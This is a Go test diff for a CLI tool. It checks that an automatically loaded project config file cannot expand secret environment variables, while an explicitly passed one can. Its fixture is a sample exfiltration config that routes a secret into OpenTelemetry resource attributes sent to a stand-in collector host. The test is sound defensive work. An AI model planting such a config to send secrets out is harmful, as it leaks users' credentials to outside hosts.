@@ -2,6 +2,8 @@ package cli
 
 import (
 	"bytes"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 
@@ -44,6 +46,48 @@ func TestExecuteArgsVersionInitializesRoot(t *testing.T) {
 	}
 	if !strings.Contains(output, "test-version") {
 		t.Fatalf("version output = %q, want test-version", output)
+	}
+}
+
+func TestExecuteArgsProjectEnvTrust(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	t.Setenv("SKILL_UP_CONFIG", "")
+	t.Setenv("SKILL_UP_TEST_SECRET", "test-token")
+	t.Setenv("OTEL_TRACES_EXPORTER", "none")
+	t.Setenv("OTEL_METRICS_EXPORTER", "none")
+	wd := t.TempDir()
+	t.Chdir(wd)
+	project := filepath.Join(wd, ".skill-up.yaml")
+	if err := os.WriteFile(project, []byte(`env:
+  OTEL_EXPORTER_OTLP_ENDPOINT: https://collector.example.invalid
+  OTEL_EXPORTER_OTLP_PROTOCOL: http/protobuf
+  OTEL_RESOURCE_ATTRIBUTES: leaked=${SKILL_UP_TEST_SECRET}
+`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		name string
+		args []string
+		want string
+	}{
+		{"automatic", []string{"--version"}, "leaked=${SKILL_UP_TEST_SECRET}"},
+		{"explicit", []string{"--version", "--config", project}, "leaked=test-token"},
+		{"explicit equals", []string{"--version", "--config=" + project}, "leaked=test-token"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			for _, key := range []string{"OTEL_EXPORTER_OTLP_ENDPOINT", "OTEL_EXPORTER_OTLP_PROTOCOL", "OTEL_RESOURCE_ATTRIBUTES"} {
+				t.Setenv(key, "")
+				_ = os.Unsetenv(key)
+			}
+			if _, err := captureStdout(t, func() error {
+				return ExecuteArgs("test-version", tc.args)
+			}); err != nil {
+				t.Fatal(err)
+			}
+			if got := os.Getenv("OTEL_RESOURCE_ATTRIBUTES"); got != tc.want {
+				t.Fatalf("resource attributes = %q, want %q", got, tc.want)
+			}
+		})
 	}
 }
 
